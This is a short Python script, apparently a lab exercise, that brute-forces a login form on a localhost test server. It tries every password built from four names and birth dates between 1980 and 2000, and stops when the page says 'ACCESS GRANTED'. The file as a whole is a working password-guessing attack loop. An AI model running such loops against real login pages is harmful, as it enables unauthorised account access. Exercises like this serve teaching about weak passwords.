import requests
from itertools import product

# Runs the attack
def brute_force_attack():
    target_url = "http://localhost:8080/login"
    username = "admin"
    name = "om khadka"
    
    # Defining vars for the attack
    names = ["alice", "bob", "charlie", "eve"]
    days = [f"{i:02d}" for i in range(1, 32)]   # Make sure that days are formatted correctly if <10
    months = [f"{i:02d}" for i in range(1, 13)] # Same for months <10   
    years = [str(year) for year in range(1980, 2001)]   # Millenials are typically born from 1980-2000 (I believe?)
    
    
    print(f"Total possible combinations: {len(names) * len(days) * len(months) * len(years)}\n")
    print(f"Starting brute force attack...\n")
    
    # Make every possible combination and send it in to the login as a POST req.
    count = 0
    for name_val in names:
        for day in days:
            for month in months:
                for year in years:
                    password = f"{name_val}-{day}-{month}-{year}"
                    
                    # prep the form data
                    data = {
                        "username": username,
                        "name": name,
                        "password": password
                    }
                    
                    # Send POST request
                    response = requests.post(target_url, data=data)
                    
                    # Login success
                    if "ACCESS GRANTED" in response.text:
                        print(f"SUCCESS! Password found: {password}\n")
                        print(f"Body:\n{response.text}")
                        print(f"\nTotal iterations: {count}")
                        
                        return password
                    
                    # Keep track of how many iterations r happening
                    count += 1    
    # No pswd was valid.
    print("Password not found")
    return None

if __name__ == "__main__":
    brute_force_attack()